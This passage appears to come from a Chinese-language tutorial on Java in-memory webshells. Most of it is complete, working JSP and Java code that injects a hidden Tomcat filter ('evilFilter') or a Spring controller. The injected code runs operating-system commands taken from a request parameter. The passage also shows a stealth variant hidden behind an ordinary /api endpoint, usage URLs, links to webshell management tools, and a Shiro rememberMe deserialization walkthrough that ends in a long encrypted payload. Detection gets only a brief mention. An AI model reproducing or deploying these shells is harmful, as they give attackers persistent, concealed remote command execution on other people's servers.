            HttpServletResponse lresponse = (HttpServletResponse) res;
            if (lrequest.getParameter("cmd") != null){
                Process process = Runtime.getRuntime().exec(lrequest.getParameter("cmd"));
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
                lresponse.getOutputStream().flush();
                lresponse.getOutputStream().close();
                return;
            }
         }
```

##### addServlet.jsp

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!-- http://localhost:8086/addServlet.jsp -->
<!-- http://localhost:8086/?cmd3=dir -->

<%
  Field appContextField = ApplicationContextFacade.class.getDeclaredField("context");
  appContextField.setAccessible(true);
  Field standardContextField = ApplicationContext.class.getDeclaredField("context");
  standardContextField.setAccessible(true);

  ServletContext servletContext = request.getSession().getServletContext();
  ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

  Filter filter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
      if (request.getParameter("cmd3") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd3")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd3")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
      }
      chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }

  };
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName("evilFilter");
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);

  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

  Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
  filterConfigsField.setAccessible(true);
  Map filterConfigs = (Map) filterConfigsField.get(standardContext);
  filterConfigs.put("evilFilter", filterConfig);

  FilterMap filterMap = new FilterMap();
  filterMap.addURLPattern("/*");
  filterMap.setFilterName("evilFilter");
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);

  out.println("inject servlet success");
%>
```

###### 使用

http://localhost:8880/ServletJspProject_war_exploded/upload/addServlet.jsp

![image-20241101152258540](https://image.201068.xyz/assets/8.Java内存马/image-20241101152258540.png)

```bash
http://localhost:8880/ServletJspProject_war_exploded/upload/addServlet.jsp?cmd3=calc
```

![image-20241101152338442](https://image.201068.xyz/assets/8.Java内存马/image-20241101152338442.png)

### 基于Spring内存马

#### Controller型内存

类比于tomcat中的`StandardContext`在Spring中也有相应的`context`对象为`WebApplicationContext`。

`WebApplicationContext`继承了`BeanFactory`，

所以能用getBean直接获取`RequestMappingHandlerMapping`，进而注册路由，重点是如何获取`WebApplicationContext`。

#### 核心代码如下

```java
//将DispatcherServlet的CONTEXT上下转换成WebApplicationContext 。
 WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//从 Spring 上下文中获取 RequestMappingHandlerMapping 的实例。RequestMappingHandlerMapping 是一个 Spring MVC 的核心组件，用于处理请求映射的注册和查找。
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//拿到text方法，该方法就是恶意类
        Method method2 = InjectToController.class.getMethod("test");
//设置了一个 URL "good"。这意味着该请求将会处理路径为 /good 的 HTTP 请求
        PatternsRequestCondition url = new PatternsRequestCondition("good");
//用于定义请求方法（如 GET、POST 等）。在这里没有设置具体的请求方法，表示该请求映射会适用于所有 HTTP 方法。
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        InjectToController injectToController = new InjectToController("aaa");
//将创建的 RequestMappingInfo、控制器实例 (injectToController) 及其方法 (method2) 注册到 mappingHandlerMapping 中。这样，当收到符合条件的 HTTP 请求（即请求路径为 /good）时，Spring MVC 会调用 injectToController 实例中的 test 方法。
        mappingHandlerMapping.registerMapping(info, injectToController, method2); 
```

#### 恶意类：

```java
 public void test() throws  IOException{
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

    //exec
    try {
        String arg0 = request.getParameter("cmd");
        PrintWriter writer = response.getWriter();
        if (arg0 != null) {
            String o = "";
            java.lang.ProcessBuilder p;
           if(System.getProperty("os.name").toLowerCase().contains("win")){
               p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
           }else{
                p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
            }
            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
            o = c.hasNext() ? c.next(): o;
           c.close();
           writer.write(o);
           writer.flush();
           writer.close();
       }else{
           response.sendError(404);
       }
    }catch (Exception e){}
}
```

#### InjectToController

```java
package exp;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class InjectToController {
    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method2 = InjectToController.class.getMethod("test");
        PatternsRequestCondition url = new PatternsRequestCondition("good");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }
    public InjectToController(String aaa) {}

    public void test() throws  IOException{
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        //exec
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                response.sendError(404);
            }
        }catch (Exception e){}
    }
}
```

#### 使用

![image-20241101153534041](https://image.201068.xyz/assets/8.Java内存马/image-20241101153534041.png)

##### 内存马检测

###### 1.访问`/mappings`查看已有的`mappings`

http://localhost:8077/Spring_1_0_SNAPSHOT/mappings

![image-20241101153623980](https://image.201068.xyz/assets/8.Java内存马/image-20241101153623980.png)

###### 2.访问`/test1`注册`Controller`内存马

http://localhost:8077/Spring_1_0_SNAPSHOT/test1

![image-20241101153732681](https://image.201068.xyz/assets/8.Java内存马/image-20241101153732681.png)

###### 3.再次访问`/mappings`进行内存马检测

http://localhost:8077/Spring_1_0_SNAPSHOT/mappings

![image-20241101153753242](https://image.201068.xyz/assets/8.Java内存马/image-20241101153753242.png)

###### 4.使用

```bash
http://localhost:8077/Spring_1_0_SNAPSHOT/good?cmd=whoami
```

![image-20241101153918307](https://image.201068.xyz/assets/8.Java内存马/image-20241101153918307.png)

##### 隐形马（劫持马）

###### 1.访问`/api`发现这是一个普通接口

![image-20241101154155617](https://image.201068.xyz/assets/8.Java内存马/image-20241101154155617.png)

http://localhost:8077/Spring_1_0_SNAPSHOT/api

![image-20241101154118595](https://image.201068.xyz/assets/8.Java内存马/image-20241101154118595.png)

###### 2.访问`/test2`注册隐藏内存马

![image-20241101154307446](https://image.201068.xyz/assets/8.Java内存马/image-20241101154307446.png)

http://localhost:8077/Spring_1_0_SNAPSHOT/test2

![image-20241101154346667](https://image.201068.xyz/assets/8.Java内存马/image-20241101154346667.png)

###### 3.再次访问`/api`一切正常

http://localhost:8077/Spring_1_0_SNAPSHOT/api

![image-20241101154432918](https://image.201068.xyz/assets/8.Java内存马/image-20241101154432918.png)

> `ok ordinary api`变成 `ok`

###### 4.如果加上参数`/api?cmd=whoami`发现这是内存马

```bash
http://localhost:8077/Spring_1_0_SNAPSHOT/api?cmd=whoami
```

![image-20241101154532453](https://image.201068.xyz/assets/8.Java内存马/image-20241101154532453.png)

### WebShell管理工具

https://blog.csdn.net/lza20001103/article/details/126320868

> 哥斯拉、蚁剑、冰蝎

#### 哥斯拉：

项目地址：https://github.com/BeichenDream/Godzilla

下载地址：https://github.com/BeichenDream/Godzilla/releases/download/v4.0.1-godzilla/godzilla.jar

需要用java环境来启动，下载后通过java -jar 的方式启动对应的jar文件，进行工具的初始化操作。

```bash
java -jar godzilla.jar
```

可以通过该工具先生成对应的恶意类，

然后将其恶意类通过文件上传的方式打入目标服务器，

最后通过该管理工具进行对目标的添加，

最后进行利用。

#### 冰蝎：

项目地址：https://github.com/rebeyond/Behinder

#### 蚁剑：

项目地址：https://github.com/AntSwordProject/AntSword-Loader

### shiro反序列化整合内存马实战训练

#### 思路

通过**Shiro反序列化漏洞**打入**内存马**

1. 搭建Shiro。
2. 构建反序列化内存马并加密生成字符串。
3. 抓包修改rememberMe对应的value值。
4. 验证。

#### 1.搭建shiro：

利用tomcat搭建最简单的`shiro`：

> JDK8
>
> tomcat8.5

![image-20241101160100976](https://image.201068.xyz/assets/8.Java内存马/image-20241101160100976.png)

![image-20241101162612899](https://image.201068.xyz/assets/8.Java内存马/image-20241101162612899.png)

http://localhost:8989/shirodemo/

![image-20241101160149984](https://image.201068.xyz/assets/8.Java内存马/image-20241101160149984.png)

http://localhost:8989/shirodemo/login.jsp

![image-20241101160959029](https://image.201068.xyz/assets/8.Java内存马/image-20241101160959029.png)

#### 2、构建反序列化内存马并加密生成字符串。

##### TomcatFilter.jsp

![image-20241101160614311](https://image.201068.xyz/assets/8.Java内存马/image-20241101160614311.png)

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    final String name = "evil";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                System.out.println("Do Filter ......");
                String cmd;
                if ((cmd = servletRequest.getParameter("cmd")) != null) {
                    Process process = Runtime.getRuntime().exec(cmd);
                    java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                            new java.io.InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }
                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                    return;
                }

                filterChain.doFilter(servletRequest,servletResponse);
                System.out.println("doFilter");
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
    }
%>
```

##### 运行

![image-20241101160453829](https://image.201068.xyz/assets/8.Java内存马/image-20241101160453829.png)

##### 结果

```bash
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